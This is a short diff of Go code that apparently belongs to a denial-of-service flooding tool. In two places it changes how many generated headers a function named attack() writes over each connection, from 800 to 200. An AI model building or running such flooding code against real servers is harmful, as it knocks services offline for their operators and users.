@@ -123,7 +123,7 @@ func attack() {
 			if err != nil {
 				fmt.Println("Connection Down!!!")
 			} else {
-				for i := 0; i < 800; i++ {
+				for i := 0; i < 200; i++ {
 					x.Write([]byte(getheader()))
 				}
 				x.Close()
@@ -134,7 +134,7 @@ func attack() {
 			if err != nil {
 				fmt.Println("Connection Down!!!")
 			} else {
-				for i := 0; i < 800; i++ {
+				for i := 0; i < 200; i++ {
 					s.Write([]byte(getheader()))
 				}
 				s.Close()
